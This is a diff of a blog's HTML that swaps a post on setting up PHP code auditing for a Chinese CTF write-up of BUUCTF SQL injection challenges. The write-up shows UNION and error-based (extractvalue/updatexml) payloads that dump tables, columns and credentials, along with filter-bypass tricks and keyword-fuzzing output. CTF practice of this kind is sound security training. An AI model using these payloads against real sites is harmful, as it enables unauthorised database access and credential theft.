@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="php代码环境, 黛色若梦">
+    <meta name="keywords" content="SQL注入题目-BUU, 黛色若梦">
     <meta name="description" content="A Freshman">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>php代码环境 | 黛色若梦</title>
+    <title>SQL注入题目-BUU | 黛色若梦</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -311,12 +311,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/18.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/22.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">php代码环境</h1>
+                    <h1 class="description center-align post-title">SQL注入题目-BUU</h1>
                 </div>
             </div>
         </div>
@@ -432,8 +432,8 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">
-                                <span class="chip bg-color">php代码审计</span>
+                            <a href="/tags/sql/">
+                                <span class="chip bg-color">sql</span>
                             </a>
                         
                     </div>
@@ -448,7 +448,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>Publish Date:&nbsp;&nbsp;
-                    2022-03-13
+                    2022-03-14
                 </div>
                 
 
@@ -469,13 +469,58 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>代码审计动态调配：phpstorm+PHPstudy+xdebug+seay源码审计</p>
-<p>系统的学习一下PHP代码审计，自己之前的一些代码知识都差不多忘光了。用phpstorm和xdebug搭建一下代码审计环境.这个还是搞了挺久。</p>
-<p>phpstorm激活码2022：<a target="_blank" rel="noopener" href="http://www.xitongcheng.com/soft/bcjz_xiazai_14992.html">Phpstorm下载_phpstorm集成开发环境软件免费下载2021.2.1 官网版－系统城软件园 (xitongcheng.com)</a></p>
-<p>然后在小皮面板的7.x后基本上的扩展里面都有xdebug，所以我们只需勾选再配置php.ini就好了，然后至于火狐的扩展有两个我们可以选择其中一种。然后最主要的还是phpstorm的配置，这个要细心。</p>
-<p>具体的参考一下下面的博客：</p>
-<p><a target="_blank" rel="noopener" href="https://segmentfault.com/a/1190000018090880?utm_source=sf-similar-article">PhpStorm配置Xdebug调试 - SegmentFault 思否</a></p>
-<p><a target="_blank" rel="noopener" href="https://kento.blog.csdn.net/article/details/121828751?spm=1001.2101.3001.6661.1&utm_medium=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~Rate-1.pc_relevant_default&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~Rate-1.pc_relevant_default&utm_relevant_index=1">(51条消息) tp代码审计动态调试环境搭建（phpstudy+phpstorm）史上最详细_KKKKKento的博客-CSDN博客_phpstorm phpstudy 代码审计</a></p>
+                <h1 id="sql注入题目-buu"><a href="#sql注入题目-buu" class="headerlink" title="sql注入题目-buu"></a>sql注入题目-buu</h1><p>好了作者是来把所有的坑踩一遍，然后来给你们排错的。</p>
+<h3 id="1-极客大挑战-2019-EasySQL"><a href="#1-极客大挑战-2019-EasySQL" class="headerlink" title="1.[极客大挑战 2019]EasySQL"></a>1.[极客大挑战 2019]EasySQL</h3><p>这题思路是万能钥匙没什么好说的，但是就是想提醒一点就是这里密码不知道所以我们在账号里不能用闭合而只能用注释，这样就与密码无关了。</p>
+<h3 id="2-极客大挑战-2019-LoveSQL"><a href="#2-极客大挑战-2019-LoveSQL" class="headerlink" title="2.[极客大挑战 2019]LoveSQL"></a>2.[极客大挑战 2019]LoveSQL</h3><p>这一题就是联合注入，没有过滤掉什么。</p>
+<h5 id="一般union过程格式"><a href="#一般union过程格式" class="headerlink" title="一般union过程格式"></a>一般union过程格式</h5><p>练一练过程摘录一下以后直接套：</p>
+<p>爆显示位：</p>
+<p>order by 3</p>
+<p>试一下显示位：</p>
+<p>union select 1,2,3 </p>
+<p>爆表：</p>
+<p>username=%20%27%20union%20select%201,2,group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=database()%23&amp;password=111</p>
+<p>爆列：</p>
+<p>username=%20%27%20union%20select%201,2,group_concat(column_name)%20from%20information_schema.columns%20where%20table_name=%27l0ve1ysq1%27%23&amp;password=111</p>
+<p>爆字段：</p>
+<p>username=%20%27%20union%20select%201,2,group_concat(id,username,password)%20from%20l0ve1ysq1%23&amp;password=111</p>
+<h3 id="3-极客大挑战-2019-BabySQL"><a href="#3-极客大挑战-2019-BabySQL" class="headerlink" title="3.极客大挑战 2019]BabySQL"></a>3.极客大挑战 2019]BabySQL</h3><p>题目提醒采用过滤，我们先在原始页面尝试一下一些常见的注入点或注入方式。发现像一开始的easysql一样的是可以用#注释掉的，但是这里当输入：</p>
+<p><img src="../images/3.151.png" alt="3.151"></p>
+<p>回显被过滤 ，这个是属于被置换为空的类型，没有办法用bp去fuzz，所以我们就试着一个个去尝试。这里过滤了order，by，union，select，or，from，where都可以用双写绕过。</p>
+<h3 id="4-极客大挑战-2019-HardSQL"><a href="#4-极客大挑战-2019-HardSQL" class="headerlink" title="4.极客大挑战 2019]HardSQL"></a>4.极客大挑战 2019]HardSQL</h3><p>这一题犯了一个很致命的错误就是注入点是灵活的，但是我们一般选username然后可以把密码注释掉。</p>
+<p>然后发现了一个写着可以判断回显过滤的字符的页面，所以可以用bp来fuzz，然后线程要尽量小一点不让到后面都爆不出来了。</p>
+<p>还有一种方法就是</p>
+<h5 id="写sqlfuzz的脚本"><a href="#写sqlfuzz的脚本" class="headerlink" title="写sqlfuzz的脚本"></a>写sqlfuzz的脚本</h5><p><strong>“C:\Program Files\Python39\python.exe” D:/ctftools/webtools/3.SQL注入工具/盲注脚本/sql盲注/sqlfuzz.py</strong><br>通过: select<br>该字符是非法字符: union<br>该字符是非法字符: and<br>通过: or<br>该字符是非法字符: sleep<br>通过: where<br>通过: from<br>通过: limit<br>通过: group<br>该字符是非法字符: by<br>通过: like<br>通过: prepare<br>通过: as<br>该字符是非法字符: if<br>该字符是非法字符: char<br>该字符是非法字符: ascii<br>该字符是非法字符: mid<br>通过: left<br>通过: right<br>该字符是非法字符: substring<br>该字符是非法字符: handler<br>通过: updatexml<br>通过: extractvalue<br>该字符是非法字符: benchmark<br>该字符是非法字符: insert<br>通过: update<br>通过: all<br>通过: @<br>通过: #<br>通过: ^<br>通过: &amp;<br>该字符是非法字符: *<br>通过: ‘<br>通过: “<br>通过: ~<br>通过: `<br>通过: (<br>通过: )<br>通过: –<br>该字符是非法字符: =<br>通过: /<br>该字符是非法字符: <br>该字符是非法字符:  </p>
+<p>进程已结束，退出代码为 0</p>
+<h5 id="常见过滤替代："><a href="#常见过滤替代：" class="headerlink" title="常见过滤替代："></a>常见过滤替代：</h5><p>空格可以用括号替代；</p>
+<p>这里=可以用like表示；</p>
+<p>substr()可以用right代替。</p>
+<p>然后就可以快速判断可以用什么类型的注入方法。</p>
+<p>这题可以用</p>
+<h5 id="报错注入函数用法"><a href="#报错注入函数用法" class="headerlink" title="报错注入函数用法"></a>报错注入函数用法</h5><p>可以记忆一下函数的用法：</p>
+<p>extractvalue(1,concat(0x7e,执行语句))</p>
+<p>updatexml(1,concat(0x7e,执行语句),1)</p>
+<p>爆表名：</p>
+<p><a target="_blank" rel="noopener" href="http://e86dfe0c-a276-4971-a11d-6da6adcf0ca0.node4.buuoj.cn:81/check.php?username=admin&#39;or(extractvalue(1,concat(0x7e,(**select(table_name)**from(information_schema.tables)where(table_schema)like(database())))))%23&amp;password=122">http://e86dfe0c-a276-4971-a11d-6da6adcf0ca0.node4.buuoj.cn:81/check.php?username=admin&#39;or(extractvalue(1,concat(0x7e,(**select(table_name)**from(information_schema.tables)where(table_schema)like(database())))))%23&amp;password=122</a></p>
+<p>这里出现了一个错误，就是没有用group_concat,所以就没办法合在一行，因为这里只有一个字段就会显了，但是在爆列名时就出不来了。</p>
+<p>爆列名：</p>
+<p><a target="_blank" rel="noopener" href="http://e86dfe0c-a276-4971-a11d-6da6adcf0ca0.node4.buuoj.cn:81/check.php?username=admin&#39;or(extractvalue(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(&#39;H4rDsq1&#39;)))))%23&amp;password=122">http://e86dfe0c-a276-4971-a11d-6da6adcf0ca0.node4.buuoj.cn:81/check.php?username=admin&#39;or(extractvalue(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(&#39;H4rDsq1&#39;)))))%23&amp;password=122</a></p>
+<p>爆字段：</p>
+<p><a target="_blank" rel="noopener" href="http://e86dfe0c-a276-4971-a11d-6da6adcf0ca0.node4.buuoj.cn:81/check.php?username=admin&#39;or(extractvalue(1,concat(0x7e,(select(group_concat(id,username,password))from(H4rDsq1)))))%23&amp;password=122">http://e86dfe0c-a276-4971-a11d-6da6adcf0ca0.node4.buuoj.cn:81/check.php?username=admin&#39;or(extractvalue(1,concat(0x7e,(select(group_concat(id,username,password))from(H4rDsq1)))))%23&amp;password=122</a></p>
+<p>~1flagflag{6ca9ceb1-949e-4e57-bc’</p>
+<p>但是这里还有一个坑就是回显字段只有一半，所以应该还有一个函数可以限制字符输出长度。</p>
+<p>没出全，因为<strong>extractvalue和updatexml()都有最长32的长度限制</strong><br> 这时候就要想到mysql的一些函数，substr，left，right</p>
+<ul>
+<li>substr(字符串，起始位置，截取长度）</li>
+<li>left(字符串，截取长度)#从左往右截取<code>*</code>位</li>
+<li>right(字符串，截取长度)#从右往左截取<code>*</code>位</li>
+</ul>
+<p><a target="_blank" rel="noopener" href="http://e86dfe0c-a276-4971-a11d-6da6adcf0ca0.node4.buuoj.cn:81/check.php?username=admin&#39;or(extractvalue(1,concat(0x7e,(select(right(password,20))from(H4rDsq1)))))%23&amp;password=122">http://e86dfe0c-a276-4971-a11d-6da6adcf0ca0.node4.buuoj.cn:81/check.php?username=admin&#39;or(extractvalue(1,concat(0x7e,(select(right(password,20))from(H4rDsq1)))))%23&amp;password=122</a></p>
+<p>~7-bc26-288ca6328b3d}</p>
+<h3 id="5-强网杯-2019-随便注"><a href="#5-强网杯-2019-随便注" class="headerlink" title="5.强网杯 2019]随便注"></a>5.强网杯 2019]随便注</h3><p>判断注入点和注入的字段。</p>
+<p>用联合方式提交一个请求，发现过滤以下代码。所以我们就换一种注入方式</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">return preg_match(&quot;/select|update|delete|drop|insert|where|\./i&quot;,$inject);</span><br></pre></td></tr></table></figure>
+
+<p>所以考虑其他注入方式</p>
 
                 
             </div>
@@ -502,7 +547,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://example.com/2022/03/13/php%E4%BB%A3%E7%A0%81%E7%8E%AF%E5%A2%83/">http://example.com/2022/03/13/php%E4%BB%A3%E7%A0%81%E7%8E%AF%E5%A2%83/</a>
+                    <a href="http://example.com/2022/03/14/SQL%E6%B3%A8%E5%85%A5%E9%A2%98%E7%9B%AE-BUU/">http://example.com/2022/03/14/SQL%E6%B3%A8%E5%85%A5%E9%A2%98%E7%9B%AE-BUU/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -540,8 +585,8 @@
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">
-                                    <span class="chip bg-color">php代码审计</span>
+                                <a href="/tags/sql/">
+                                    <span class="chip bg-color">sql</span>
                                 </a>
                             
                         </div>
@@ -717,13 +762,13 @@
             <div class="article-badge left-badge text-color">
                 <i class="fas fa-chevron-left"></i>&nbsp;Previous</div>
             <div class="card">
-                <a href="/2022/03/14/SQL%E6%B3%A8%E5%85%A5%E9%A2%98%E7%9B%AE-BUU/">
+                <a href="/2022/03/20/game-week1/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/22.jpg" class="responsive-img" alt="SQL注入题目-BUU">
+                        <img src="/medias/featureimages/3.jpg" class="responsive-img" alt="game--week1">
                         
-                        <span class="card-title">SQL注入题目-BUU</span>
+                        <span class="card-title">game--week1</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -734,7 +779,7 @@
                     </div>
                     <div class="publish-info">
                         <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2022-03-14
+                            <i class="far fa-clock fa-fw icon-date"></i>2022-03-20
                         </span>
                         <span class="publish-author">
                             
@@ -747,8 +792,8 @@
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/sql/">
-                        <span class="chip bg-color">sql</span>
+                    <a href="/tags/game/">
+                        <span class="chip bg-color">game</span>
                     </a>
                     
                 </div>
@@ -762,13 +807,13 @@
                 Next&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2022/03/07/buu3/">
+                <a href="/2022/03/13/php%E4%BB%A3%E7%A0%81%E7%8E%AF%E5%A2%83/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/17.jpg" class="responsive-img" alt="buu3">
+                        <img src="/medias/featureimages/18.jpg" class="responsive-img" alt="php代码环境">
                         
-                        <span class="card-title">buu3</span>
+                        <span class="card-title">php代码环境</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -779,7 +824,7 @@
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2022-03-07
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-03-13
                             </span>
                         <span class="publish-author">
                             
@@ -792,8 +837,8 @@
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/ctf%E9%A2%98%E7%9B%AE-web/">
-                        <span class="chip bg-color">ctf题目--web</span>
+                    <a href="/tags/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">
+                        <span class="chip bg-color">php代码审计</span>
                     </a>
                     
                 </div>
